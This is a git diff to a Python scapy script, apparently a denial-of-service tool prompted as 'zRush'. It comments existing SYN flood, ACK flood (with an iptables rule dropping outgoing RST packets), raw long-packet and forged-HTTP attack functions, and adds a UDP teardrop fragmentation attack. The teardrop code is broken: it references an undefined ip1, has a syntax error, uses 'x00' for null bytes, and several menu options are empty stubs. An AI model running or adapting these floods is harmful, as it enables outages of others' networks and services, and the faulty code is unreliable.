@@ -1,3 +1,4 @@
+from sys import flags
 from scapy.all import*
 import os
 import time
@@ -5,6 +6,7 @@ from ftplib import FTP
 from threading import Thread
 import socket
 
+# sends SYN packet to inputted address and port but does not send ACK packet back to HOSt
 def syn_flood(src, dst, dport):
     print("[*] Initiating SYN flood attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
     srcIP = RandIP("192.168.1.1/24")
@@ -26,7 +28,7 @@ def syn_flood(src, dst, dport):
         print(str(i), "SYN packets sent. Runtime", round(runtime,3) ,"seconds.")
         print("Rate:", round(i/runtime,3), "packets per second.")
 
-
+# starts a new TCP connection, receives SYN/ACK, and sends ACK packet back, indefinetly loops this actino
 def ACK_attack(src, dst, dport):
     print("[*] Initiating ACK attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
     cmd = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
@@ -53,6 +55,7 @@ def ACK_attack(src, dst, dport):
         print("Rate:", round(i/runtime,3), "packets per second.")
         os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")
 
+# sends a very long, no carriage return character string as a TCP packet
 def lpacket_raw(src, dst, dport):
     try:
         c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -70,6 +73,7 @@ def lpacket_raw(src, dst, dport):
         print("Rate:", round(i/runtime,3), "packets per second.")
         c.close()
 
+# sends forged HTTP request to target address and port
 def HTTPhackery(src, dst, dport):
     #syn
     sport = random.randint(1024, 65535)
@@ -84,3 +88,35 @@ def HTTPhackery(src, dst, dport):
     print("HTTP request sent:", getStr)
     reply = sr1(ip/ACK/getStr)
     print(reply)
+
+# teardrop attack through UDP
+def UDPteardrop(src, dst, dport):
+    print("[*] Select attack options from below:")
+    print("    1. small payload (36 bytes), 2 packets, offset = 3x8 bytes")
+    print("    2. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
+    print("    3. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
+    print("    4. large payload (1300 bytes), 2 packets, offset = 3x8 bytes")
+    print("    5. large payload (1300 bytes), 2 packets, offset = 10x8 bytes")
+    x = input("zRush > ")
+    print("Using attack",x)
+    match x:
+        case "1":
+            size = 36
+            offset = 3
+            load1 = "\x00"*size
+            ip = IP(src = src, dst = dst, flags = "MF", proto = 17)
+
+            size = 4
+            offset = 18
+            load2 = "x00"*size
+
+            ip2 = IP(src = src, dst = dst, flags = "MF", proto = 17 frag = offset)
+            
+            send(ip1/load1)
+            send(ip2/load2)
+        case "2":
+            print("*")
+        case "3":
+            print("*")
+        case "4":
+            print("*")
